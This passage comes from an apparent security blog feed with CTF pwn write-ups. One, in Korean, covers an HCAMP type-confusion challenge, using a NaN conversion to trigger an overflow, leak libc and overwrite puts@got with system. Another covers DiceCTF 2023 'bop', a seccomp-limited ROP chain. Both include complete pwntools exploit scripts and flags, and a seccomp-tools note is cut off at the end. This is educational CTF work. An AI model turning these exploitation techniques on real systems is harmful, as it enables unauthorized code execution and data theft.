&lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *cal_num-&gt;_float37 = *cal_num-&gt;_float35 / *cal_num-&gt;_float36; <span class="comment">// [**]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">    Print_Note();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">    Number_Check(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> 를 보자. 처음에 이 함수를 보고 저기서 무조건 타입 컨퓨젼이 날 것이라 생각했다. 왜냐면 float 연산 결과를 int에 담으면 매우매우 큰 수가 담기기 떄문이다. 하지만 내가 <code>scanf(&quot;%1f %c %1f&quot;, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</code> 이 구문을 잘못 이해하고 있었다. <code>%1f</code>의 이미는 정수형으로 한 자리만 입력받겠다는 것을 의미한다. 나는 소수점 한자리인 줄 알고 디버깅해보면서 의문이 너무나 많았다.</p><p>참고로 <code>float</code> 연산을 한다는 것은 어셈블리를 보고 바로 파악할 수 있었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F0D                 mov     rax, cs:_ZL7cal_num._int ; cal_num</span><br><span class="line">.text:0000000000400F14                 mov     rax, [rax+110h]</span><br><span class="line">.text:0000000000400F1B                 cvttss2si rdx, xmm0</span><br><span class="line">.text:0000000000400F20                 mov     [rax], edx</span><br></pre></td></tr></table></figure><p><code>cvttss2si</code> 와 같은 (나에게 상대적으로 덜 익숙한) 어셈블리 연산은 <code>float</code> 연산에서 사용하기 때문이다.</p><p>그리고 <code>Number_change</code>라는 수상한 함수가 보여서 바로 확인했다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *<span class="title function_">Number_change</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(cal_num-&gt;_float38) = *cal_num-&gt;_int34;</span><br><span class="line">  *cal_num-&gt;_int34 = *cal_num-&gt;_float37; <span class="comment">// [*]</span></span><br><span class="line">  *cal_num-&gt;_float37 = SLODWORD(cal_num-&gt;_float38); </span><br><span class="line">  result = *cal_num-&gt;_int34;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = cal_num-&gt;_int34;</span><br><span class="line">    --*result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>대놓고 <code>float</code> 타입의 값을 <code>int</code> 타입의 변수로 옮겨준다. 여기서 <code>type confusion</code>이 발생할 가능성이 있다. 그러나.. <code>float</code> 연산을 하던 <code>Real_cal</code> 함수에서는 정수 한자리로 계산하기 때문에 무의미하다고 생각했다. 여기서 오랜 시간 고민을 하다가 예전에 <code>Chrome 1-day</code> 분석했던 것이 떠올랐다. 정확히 뭔지는 기억 안나는데 연산 결과가 <code>NaN</code>이 나와서 <code>OOB</code>가 발생하는 취약점이 있었다. <code>NaN</code>은 <code>0/0</code>같은 것을 하면 나온다. <code>Not a Number</code>라는 뜻이다. </p><p>아무튼 바로 아래 로직으로 테스트를 진행했고 <code>overflow</code>를 트리거 할 수 있었다.</p><ol><li><code>Real_Cal</code>에서 <code>0/0</code> 입력</li><li><code>Number_Change</code> 함수 -&gt; 여기서 float의 <code>NaN</code>이 int로 넘어가는데 0보다 작기 때문에 문제 로직에 따라 -1을 함</li><li><code>overflow</code> 함수를 통해 <code>overflow</code> 발생 -&gt; -1은 <code>read</code> 세 번째 인자로 들어가면서 <code>unsigned int</code>로 형변환되기 때문에 매우 큰 수가 되어 <code>overflow</code>가 발생한다.</li></ol><p>해당 과정은 디버깅을 하면서 이해하였다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>취약점 트리거도 꽤 고생을 했는데 익스할 때도 고생을 조금 했다. <code>OOB</code>가 발생하는데 leak도 해야하고 어떠한 함수의 got를 system 함수로 덮어야하고 어딘가에 ‘&#x2F;bin&#x2F;sh\x00’ 써야하는데 어디에 쓰지.. 란 생각이 동시에 들어서 혼란스러웠다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_number</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Print Number&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 1. %d\n&quot;</span>, *cal_num-&gt;_int32);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 2. %d\n&quot;</span>, *cal_num-&gt;_int33);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Result %d\n&quot;</span>, *cal_num-&gt;_int34);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 1. %f\n&quot;</span>, *cal_num-&gt;_float35);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 2. %f\n&quot;</span>, *cal_num-&gt;_float36);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Float Result %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 main의 6가지 기능 중에 이런 것이 있었고, 나는 현재 <code>cal_num</code>에 overflow를 발생시켜 입력을 할 수 있으니 위에 보이는 저 값 즉, <code>*cal_num-&gt;_int32</code>나 <code>*cal_num-&gt;_int33</code>와 같은 값들을 덮을 수 있다. 이 기능을 이용하여 libc leak을 할 수 있다. 주의해야할 점은 이게 int라서 4바이트씩 끊어져서 leak이 된다. 하위 4바이트 출력값이 때로 음수가 될 때도 있어서 0보다 이상일 때만 걸러주었다. 아니면 그냥 예외를 강제로 발생시켜 다시 연결하였다. </p><p>이런식으로 <code>libc base</code>를 정상적으로 구할 수 있고 이제 <code>어떠한 함수</code>를 <code>system</code> 함수로 덮어야 한다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_Note</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(cal_num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>기능 중에 이런 기능이 있었고, <code>puts</code> 함수를 <code>system</code> 함수로 덮고 <code>cal_num</code>이 우리 입력값이니까 ‘&#x2F;bin&#x2F;sh\x00’을 쉽게 넣어 쉘을 따자고 생각했다. 재밌게도 이 함수는 <code>Interger_cal</code> 함수가 종료될 떄 쯤 호출이 된다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*cal_num-&gt;_int34 = *cal_num-&gt;_int32 + *cal_num-&gt;_int33;</span><br></pre></td></tr></table></figure><p><code>Interger_cal</code> 함수 상단에선 사용자 입력에 따라 이러한 연산을 수행한다. 이걸 이용하여 <code>puts@got</code>를 <code>system</code> 함수로 덮을 수 있겠다고 생각했다. 먼저 <code>overflow</code> 함수에서 피 연산자 두 개에 <code>puts@got</code>를 4바이트씩 잘라서 넣어놓고 <code>Interger_cal</code> 함수에서 <code>puts@got</code>에다가 값을 쓸 수 있다. 이 때 중요한 것은 4바이트씩 잘 잘라서 넣어줘야한다는 것이다. 그럼 이제 쉘을 획득할 수 있다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0 / 0&#x27;</span>) <span class="comment"># nan</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>)) <span class="comment"># float -&gt; int</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span></span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">4</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 1.&#x27;</span>)</span><br><span class="line">        got1 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">        info(<span class="built_in">hex</span>(got1))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 2.&#x27;</span>)</span><br><span class="line">        got2 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment"># 7f??</span></span><br><span class="line">        info(<span class="built_in">hex</span>(got2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> got1 &gt; <span class="number">0</span>:</span><br><span class="line">            leak = <span class="built_in">hex</span>(got2) + <span class="built_in">hex</span>(got1)[<span class="number">2</span>:]</span><br><span class="line">            info(<span class="string">&#x27;leak : &#x27;</span> +leak)</span><br><span class="line">            libc.address = <span class="built_in">int</span>(leak, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">            info(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span>- <span class="built_in">len</span>(payload))</span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])   <span class="comment"># [32]</span></span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>]+<span class="number">4</span>) <span class="comment"># [33] 7f?? =&gt; got2</span></span><br><span class="line">            </span><br><span class="line">            p.send(payload)</span><br><span class="line"></span><br><span class="line">            system_low = <span class="built_in">int</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[-<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>)) <span class="comment"># 1</span></span><br><span class="line">            payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(system_low)</span><br><span class="line">            payload += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(got2)</span><br><span class="line">            pause()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> es:</span><br><span class="line">        <span class="built_in">print</span>(es)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;FUNNY_TYPECONFUSION&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HCAMP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> Type Confusion </tag>
            
            <tag> 1-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF 2023 - bop (seccomp)</title>
      <link href="/230207-dicectf2023-bop/"/>
      <url>/230207-dicectf2023-bop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1838">https://ctftime.org/event/1838</a></li></ul><blockquote><p><code>nc mc.ax 30284</code></p></blockquote><ul><li>[159 solves &#x2F; 117 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM pwn.red/jail:0.3.1</span><br><span class="line"></span><br><span class="line">COPY --from=ubuntu@sha256:bffb6799d706144f263f4b91e1226745ffb5643ea0ea89c2f709208e8d70c999 / /srv</span><br><span class="line">COPY flag.txt /srv/app/</span><br><span class="line">COPY bop /srv/app/run</span><br></pre></td></tr></table></figure><p>I patched the binary first before solve this binary.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>We can see the function related with <code>seccomp</code> when open the binary with IDA. So we can use the <code>seccomp-tools</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Only <code>open</code>, <code>read</code>, and <code>write</code> are available. But libc’s <code>open</code> function actually uses <code>openat</code> syscall. So We can’t use that function. We have to use the <code>open</code> syscall.</p><p>I use the <code>ropper</code> to find the <code>syscall ; ret</code> gadget.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li>flag.txt open, read and write</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;mc.ax&#x27;</span> ,<span class="number">30284</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4012F9</span></span><br><span class="line">pop_rdi = <span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4013d1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper -f libc.so.6 --nocolor &gt; rop.txt</span></span><br><span class="line">pop_rdx = <span class="number">0x142c92</span> <span class="comment"># libc </span></span><br><span class="line">syscall_ret = <span class="number">0x630a9</span> <span class="comment"># libc</span></span><br><span class="line">pop_rax = <span class="number">0x36174</span> <span class="comment"># libc</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(main) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, bss, 8) flag.txt</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(./flag.txt) syscall</span></span><br><span class="line">payload += p64(pop_rax + libc.address)</span><br><span class="line">payload += p64(<span class="number">2</span>) <span class="comment"># open</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(syscall_ret + libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line">p.send(<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dice&#123;ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - seccomp</title>
      <link href="/230206-pwn-seccomp/"/>
      <url>/230206-pwn-seccomp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/dr0gba/seccomp-tools">https://github.com/dr0gba/seccomp-tools</a></li></ul><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="use"><a href="#use" class="headerlink" title="use"></a>use</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump [chall]</span><br></pre></td></tr></table></figure><ul><li>result</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 